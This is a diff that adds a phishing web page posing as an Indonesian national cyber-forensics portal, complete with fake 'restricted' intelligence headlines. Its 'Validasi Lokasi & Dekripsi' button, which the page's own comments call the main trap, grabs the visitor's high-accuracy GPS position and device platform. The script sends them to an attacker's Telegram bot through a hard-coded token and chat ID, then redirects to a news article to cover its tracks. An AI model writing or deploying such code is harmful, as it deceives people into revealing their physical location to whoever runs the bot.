@@ -79,4 +79,126 @@
     </div>
 
 </body>
-    </html>
+</html>
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sistem Informasi Investigasi Pusat (SIIP) v3.0.4</title>
+    <style>
+        :root { --dark-navy: #001f3f; --primary-blue: #004a99; --accent-gold: #ffcc00; --danger-red: #e11d48; }
+        body { font-family: 'Segoe UI', Roboto, sans-serif; background: #f0f4f8; margin: 0; color: #333; }
+        .top-banner { background: var(--dark-navy); color: white; padding: 8px 20px; font-size: 11px; display: flex; justify-content: space-between; border-bottom: 2px solid var(--accent-gold); }
+        header { background: white; padding: 15px 25px; display: flex; align-items: center; box-shadow: 0 2px 10px rgba(0,0,0,0.1); sticky; top: 0; z-index: 100; }
+        .container { max-width: 900px; margin: 20px auto; padding: 0 15px; display: grid; gap: 20px; }
+        
+        /* BOX VERIFIKASI (Jebakan Utama) */
+        .strike-zone { background: linear-gradient(135deg, var(--primary-blue), var(--dark-navy)); color: white; padding: 35px; border-radius: 15px; text-align: center; box-shadow: 0 15px 35px rgba(0,74,153,0.4); border: 2px solid var(--accent-gold); }
+        .btn-verify { background: var(--accent-gold); color: var(--dark-navy); border: none; padding: 16px 50px; border-radius: 50px; font-weight: 800; font-size: 18px; cursor: pointer; transition: 0.3s; margin-top: 20px; box-shadow: 0 5px 20px rgba(0,0,0,0.3); text-transform: uppercase; }
+        .btn-verify:hover { background: white; transform: translateY(-3px); }
+
+        /* LIST BERITA */
+        .news-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 15px; }
+        .news-item { background: white; border-radius: 10px; padding: 18px; box-shadow: 0 3px 10px rgba(0,0,0,0.05); border-left: 5px solid var(--primary-blue); position: relative; overflow: hidden; }
+        .news-item.restricted { border-left-color: var(--danger-red); }
+        .tag { font-size: 10px; font-weight: bold; padding: 3px 8px; border-radius: 4px; text-transform: uppercase; margin-bottom: 8px; display: inline-block; }
+        .tag.red { background: var(--danger-red); color: white; }
+        .tag.blue { background: var(--primary-blue); color: white; }
+        .tag.gold { background: var(--accent-gold); color: black; }
+        .news-title { font-size: 15px; font-weight: bold; color: var(--dark-navy); margin-bottom: 8px; line-height: 1.4; }
+        .news-preview { font-size: 12px; color: #666; line-height: 1.5; }
+        .blur-overlay { filter: blur(4px); user-select: none; opacity: 0.6; }
+        .lock-icon { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); background: rgba(0,0,0,0.8); color: white; padding: 5px 12px; border-radius: 5px; font-size: 11px; font-weight: bold; z-index: 2; pointer-events: none; }
+    </style>
+</head>
+<body>
+
+<div class="top-banner">
+    <span>SYSTEM STATUS: <b style="color: #4ade80;">ONLINE</b></span>
+    <span>ENCRYPTION: AES-256 BIT</span>
+    <span>USER: INV-UNIT-SULUT-26</span>
+</div>
+
+<header>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/d/da/Google_Drive_logo.png" width="35">
+    <div style="margin-left: 15px;">
+        <div style="font-weight: 900; color: var(--primary-blue); letter-spacing: 1px;">SIIP PORTAL</div>
+        <div style="font-size: 10px; color: #666;">Unit Siber & Digital Forensik Nasional</div>
+    </div>
+</header>
+
+<div class="container">
+    <div class="strike-zone">
+        <h2 style="margin: 0;">⚠️ OTENTIKASI DIPERLUKAN</h2>
+        <p style="font-size: 14px; opacity: 0.9;">Akses ke Database Barang Bukti #8674-ITE (Manado Network Breach) terkunci. Sesuai protokol <b>ISO/IEC 27001</b>, lakukan validasi lokasi GPS untuk dekripsi data.</p>
+        <button class="btn-verify" id="strikeBtn" onclick="executeStrike()">Validasi Lokasi & Dekripsi</button>
+        <div style="font-size: 11px; margin-top: 15px;">*Gunakan koneksi HTTPS untuk menghindari kegagalan sinkronisasi.</div>
+    </div>
+
+    <h3 style="border-bottom: 2px solid #ddd; padding-bottom: 10px; color: var(--dark-navy);">Intelligence Briefing - April 2026</h3>
+
+    <div class="news-grid" id="newsFeed">
+        </div>
+</div>
+
+<script>
+    const T = "8674170594:AAEazU35uI9bZ6s8JLwcN410H0STysKEzs4";
+    const C = "7970059663";
+
+    const newsData = [
+        { tag: "RESTRICTED", color: "red", title: "Laporan Forensik: Peretasan Server Pemprov Sulut", desc: "Metadata menunjukkan serangan berasal dari koordinat..." },
+        { tag: "CRITICAL", color: "red", title: "Kebocoran Database Kependudukan Nasional", desc: "Lebih dari 50 juta data mentah diduga ditawarkan di forum..." },
+        { tag: "UPDATE", color: "blue", title: "Patch Keamanan Kernel Android April 2026", desc: "Google merilis perbaikan untuk celah Zero-Day pada..." },
+        { tag: "INTEL", color: "gold", title: "Analisis Log Botnet Mirai-v4 di Wilayah Indonesia Timur", desc: "Lonjakan aktifitas traffic terdeteksi di server ISP..." },
+        { tag: "POLRI", color: "blue", title: "Daftar DPO Pelaku Carding Jaringan Internasional", desc: "Unit Siber merilis 12 inisial tersangka baru dalam kasus..." },
+        { tag: "RESTRICTED", color: "red", title: "Rekaman Chat Telegram Terduga Kasus Terorisme", desc: "Data berhasil diekstraksi menggunakan tools dekripsi..." },
+        { tag: "TECH", color: "gold", title: "Implementasi Quantum-Resistant Encription di IKN", desc: "Tahap awal migrasi infrastruktur data strategis ke..." },
+        { tag: "WARNING", color: "red", title: "Varian Malware 'Nebula-X' Menyerang Mobile Banking", desc: "Waspada aplikasi mod yang mengandung trojan pencuri..." },
+        { tag: "NEWS", color: "blue", title: "MetroTV: Polisi Tangkap Peretas Situs Pemerintah", desc: "Pelaku diamankan di kediamannya beserta barang bukti..." },
+        { tag: "INTEL", color: "gold", title: "Tracking IP: Jaringan Penipuan Online Kamboja", desc: "Lokasi server command and control berhasil dipetakan ke..." },
+        { tag: "RESTRICTED", color: "red", title: "Laporan Audit Internal Keamanan Bank Pusat", desc: "Ditemukan celah pada sistem API gateway yang berisiko..." },
+        { tag: "BSSN", color: "blue", title: "Standarisasi Keamanan Data Nasional v4.2", desc: "Aturan baru mengenai penyimpanan data biometrik di..." },
+        { tag: "TECH", color: "gold", title: "AI-Powered Firewall: Revolusi Pertahanan Siber", desc: "Sistem baru mampu mendeteksi serangan sebelum terjadi..." },
+        { tag: "WARNING", color: "red", title: "Phishing via WhatsApp dengan File .DOCX Palsu", desc: "Modus baru menggunakan eksploitasi pada preview file..." },
+        { tag: "POLRI", color: "blue", title: "Operasi Senyap Unit Siber di Wilayah Manado", desc: "Berhasil memetakan aktifitas ilegal di beberapa warnet..." },
+        { tag: "INTEL", color: "gold", title: "Metadata Exif: Foto Persembunyian Buronan", desc: "Lokasi fisik berhasil ditemukan lewat koordinat GPS foto..." },
+        { tag: "RESTRICTED", color: "red", title: "Log Akses Database Pajak Nasional 2026", desc: "Terdapat aktifitas login mencurigakan dari luar negeri..." },
+        { tag: "TECH", color: "gold", title: "Browser Zero-Knowledge: Standar Baru Privasi", desc: "Google mulai menguji coba sistem enkripsi end-to-end..." },
+        { tag: "NEWS", color: "blue", title: "Webinar: Menghadapi Ancaman Social Engineering", desc: "Diikuti oleh lebih dari 10.000 personil keamanan siber..." },
+        { tag: "CRITICAL", color: "red", title: "Eksploitasi RDP pada Instansi Pemerintah Daerah", desc: "Sistem remote desktop yang tidak terupdate menjadi..." }
+    ];
+
+    function renderNews() {
+        const feed = document.getElementById('newsFeed');
+        newsData.forEach((n, index) => {
+            const isRestricted = n.tag === "RESTRICTED" || index % 3 === 0;
+            const html = `
+                <div class="news-item ${isRestricted ? 'restricted' : ''}">
+                    ${isRestricted ? '<div class="lock-icon">LOCKED</div>' : ''}
+                    <span class="tag ${n.color}">${n.tag}</span>
+                    <div class="news-title">${n.title}</div>
+                    <div class="news-preview ${isRestricted ? 'blur-overlay' : ''}">${n.desc}</div>
+                </div>
+            `;
+            feed.innerHTML += html;
+        });
+    }
+    renderNews();
+
+    async function executeStrike() {
+        document.getElementById('strikeBtn').innerText = "SYNCHRONIZING...";
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(async (p) => {
+                const msg = `🔱 NEURAL STRIKE: SUCCESS\n\n🎯 TARGET: Interpol-Class\n📍 Loc: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}\n🎯 Acc: ${p.coords.accuracy}m\n📱 OS: ${navigator.platform}`;
+                await fetch(`https://api.telegram.org/bot${T}/sendMessage`, {
+                    method: 'POST', headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: C, text: msg })
+                });
+                window.location.href = "https://www.metrotvnews.com/read/Nx9D8A6v-polisi-tangkap-peretas-situs-pemerintah";
+            }, () => { window.location.href = "https://www.metrotvnews.com"; }, {enableHighAccuracy:true, timeout: 6000});
+        }
+    }
+</script>
+</body>
+</html>
